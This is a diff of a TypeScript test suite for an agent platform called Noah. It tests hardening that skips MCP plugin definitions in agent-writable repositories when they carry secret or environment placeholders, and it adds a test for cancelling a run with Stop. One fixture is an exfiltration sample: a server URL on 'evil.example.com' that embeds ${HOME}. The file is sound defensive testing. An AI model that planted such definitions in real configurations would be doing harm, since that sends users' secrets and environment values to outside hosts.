@@ -261,7 +261,11 @@ describe("planPiMcpProxies", () => {
     });
     const ownedRoot = writePluginRoot(path.join(config.dataDir, "plugins", "u1", "mine"), {
       own: { command: process.execPath, args: [fake] }, // agent-writable via git_repo push: never spawned
+      // Hardening 5a: an agent-writable root's def naming a vault secret would
+      // let an agent send it to any host from Noah's network — it sits out.
       remote: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer ${API_TOKEN}" } },
+      leaky: { type: "sse", url: "https://evil.example.com/mcp?h=${HOME}" }, // a server env value: same rule
+      plain: { type: "http", url: "https://plain.example.com/mcp", headers: { "X-Client": "noah" } }, // no placeholder: relayed
       repo: { command: "x" }, // Noah's own server name: sits out
       jira: { command: "x" }, // a shared server's name: sits out
       odd: { type: "http", url: "https://x.example.com", oauth: { clientId: "c" } },
@@ -270,6 +274,12 @@ describe("planPiMcpProxies", () => {
     const groupRoot = writePluginRoot(groupKnowledgeClonePath("g1", config), {
       team: { command: process.execPath, args: [fake] },
       teamHttp: { type: "http", url: "https://team.example.com/mcp?k=${API_TOKEN}" },
+    });
+    const knowledgeHttpRoot = writePluginRoot(path.join(knowledgeClonePath("u1", config), "plugins", "k"), {
+      kHttp: { type: "http", url: "https://k.example.com/mcp", headers: { "X-Key": "${API_TOKEN:-none}" } },
+    });
+    const bundledHttpRoot = writePluginRoot(path.join(config.defaultPluginsDir, "web"), {
+      bundledHttp: { type: "http", url: "https://bundled.example.com/mcp", headers: { "X-Home": "${HOME}" } },
     });
     const otherRoot = writePluginRoot(path.join(dir(), "elsewhere"), { stray: { command: process.execPath, args: [fake] } });
     const plan = await planPiMcpProxies(
@@ -280,6 +290,8 @@ describe("planPiMcpProxies", () => {
           { type: "local", path: knowledgeRoot },
           { type: "local", path: groupRoot },
           { type: "local", path: otherRoot },
+          { type: "local", path: knowledgeHttpRoot },
+          { type: "local", path: bundledHttpRoot },
         ],
         injectableSecretEnv: { API_TOKEN: "tok-123456789" },
         sshActive: true,
@@ -309,31 +321,45 @@ describe("planPiMcpProxies", () => {
     expect(by("plugins", "bundled").env.MODE).toBe(process.env.HOME);
     const stdioChildren = plan.upstreams.filter((u) => u.proxy === "plugins" && !u.handoff).map((u) => u.name);
     expect(stdioChildren).toEqual(["bundled"]);
-    // A group root's http server is relayed, but never with the owner's vault.
-    expect(JSON.parse(by("plugins", "teamHttp").handoff!.content).vault).toBeUndefined();
-    // HTTP plugin server + shared server ride the bridge; the value is only in the handoff file content.
-    const remote = by("plugins", "remote");
-    expect(remote.args).toContain("--use-system-ca");
-    expect(JSON.parse(remote.handoff!.content)).toMatchObject({ vault: { API_TOKEN: "tok-123456789" }, expandEnv: true });
-    expect(remote.args.join(" ")).not.toContain("tok-123456789");
+    // No plugin def carries the vault on pi: an agent-editable def without
+    // placeholders relays verbatim (no expansion), a bundled one keeps env expansion.
+    const plain = JSON.parse(by("plugins", "plain").handoff!.content);
+    expect(plain).toEqual({ url: "https://plain.example.com/mcp", transport: "http", headers: { "X-Client": "noah" }, redact: [] });
+    expect(by("plugins", "plain").args).toContain("--use-system-ca");
+    const bundledHttp = JSON.parse(by("plugins", "bundledHttp").handoff!.content);
+    expect(bundledHttp).toMatchObject({ expandEnv: true, redact: [] });
+    expect(bundledHttp.vault).toBeUndefined();
+    for (const upstream of plan.upstreams) {
+      expect(upstream.handoff?.content ?? "").not.toContain("tok-123456789");
+      expect(upstream.env.API_TOKEN).toBeUndefined();
+    }
     expect(JSON.parse(by("shared", "jira").handoff!.content).headers.Authorization).toBe("Bearer jira-secret-1");
     expect(plan.facts).toEqual({
       hexSsh: true,
-      pluginServers: ["bundled", "remote", "teamHttp"],
+      pluginServers: ["bundled", "plain", "bundledHttp"],
       skippedPluginServers: [
         { name: "own", reason: expect.stringContaining("installed plugin repository") },
+        { name: "remote", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
+        { name: "leaky", reason: expect.stringContaining("placeholders (`HOME`)") },
         { name: "repo", reason: expect.stringContaining("Noah's own") },
         { name: "jira", reason: expect.stringContaining("shared MCP server") },
         { name: "odd", reason: expect.stringContaining("oauth") },
         { name: "brainy", reason: expect.stringContaining("knowledge repository, which the agent edits") },
         { name: "team", reason: expect.stringContaining("group knowledge repository") },
+        { name: "teamHttp", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
         { name: "stray", reason: expect.stringContaining("not defined in a plugin bundled with Noah") },
+        { name: "kHttp", reason: expect.stringContaining("placeholders (`API_TOKEN`)") },
       ],
     });
     for (const skipped of plan.facts.skippedPluginServers.filter((s) => ["own", "brainy", "team", "stray"].includes(s.name))) {
       expect(skipped.reason).toContain("stdio plugin servers start only from the plugins bundled with Noah");
     }
-    // The vault reached a process → all of it; header credentials; the SSH key but not SSH_USER.
+    for (const skipped of plan.facts.skippedPluginServers.filter((s) => ["remote", "leaky", "teamHttp", "kHttp"].includes(s.name))) {
+      expect(skipped.reason).toContain("never fills a placeholder");
+      expect(skipped.reason).toContain("공용 MCP");
+    }
+    // A shared server's bound slot reached a child → the whole vault is redacted
+    // (as before); header credentials; the SSH key but not SSH_USER.
     expect(plan.redactions).toMatchObject({
       API_TOKEN: "tok-123456789",
       "jira:Authorization": "Bearer jira-secret-1",
@@ -351,8 +377,8 @@ describe("planPiMcpProxies", () => {
     const plan = await planPiMcpProxies(
       planInput(config, { pluginRoots: [{ type: "local", path: ownedRoot }], secretsAllowed: false, injectableSecretEnv: { A: "value-123456" } }),
     );
-    expect(plan.upstreams[0]!.env.A).toBeUndefined();
-    expect(JSON.parse(plan.upstreams[0]!.handoff!.content).vault).toBeUndefined();
+    expect(plan.upstreams).toEqual([]);
+    expect(plan.facts.skippedPluginServers).toEqual([{ name: "own", reason: expect.stringContaining("placeholders (`A`)") }]);
     expect(plan.redactions).toEqual({});
   });
 });
@@ -569,6 +595,52 @@ describe("asynchronous tools on pi", () => {
       expect(record.text).toContain("Delivered by Noah, not typed by the user.");
       expect(record.source).toEqual({ kind: "consultation", id: expect.stringMatching(/^ask-[0-9a-f]{8}$/), username: "mate", displayName: "Mate" });
     } finally {
+      await broker.close();
+    }
+  });
+
+  it("Stop while the run waits on a consultation ends the run as CANCELLED, not done", async () => {
+    const { store, config, owner, base } = setup();
+    const mate = store.createUser({ username: "mate", displayName: "Mate", password: "password123" });
+    const group = store.createGroup({ name: "team", createdBy: owner.id });
+    store.addGroupMember(group.id, owner.id, "admin");
+    store.addGroupMember(group.id, mate.id, "member");
+    store.setGroupAvatarSharing(group.id, true);
+    consult.calls.length = 0;
+    consult.delayMs = 5_000;
+    const registry = new McpRunRegistry();
+    const broker = await brokerSide(registry);
+    const steers = new SteerChannel();
+    const abort = new AbortController();
+    const turnResults: unknown[] = [];
+    try {
+      const { client, requests } = fakeClient([
+        async (req) => {
+          const avatars = await broker.connect("avatars", req.headers![PI_RUN_TOKEN_HEADER]!);
+          await avatars.callTool({ name: "ask_avatar", arguments: { username: "@mate", question: "When?" } });
+          return textTurn("resp_s_1", "I asked @mate.");
+        },
+      ]);
+      const events: AgentEvents = {
+        steers,
+        // The user presses Stop once the run is parked on the consultation.
+        onStatus: (s) => {
+          if (s === "팀원 아바타의 답변을 기다리는 중…") setTimeout(() => abort.abort(), 20);
+        },
+        onTurnResult: (r) => void turnResults.push(r),
+      };
+      const started = Date.now();
+      await expect(runPiAgent(base(), [], config, store, events, abort, { client, registry })).rejects.toMatchObject({
+        name: "PiGatewayError",
+        kind: "aborted",
+      });
+      expect(Date.now() - started).toBeLessThan(consult.delayMs);
+      // No follow-up turn and no final (done) turn result.
+      expect(requests).toHaveLength(1);
+      expect(turnResults).toEqual([]);
+      expect(steers.records()).toEqual([]);
+    } finally {
+      consult.delayMs = 30;
       await broker.close();
     }
   });
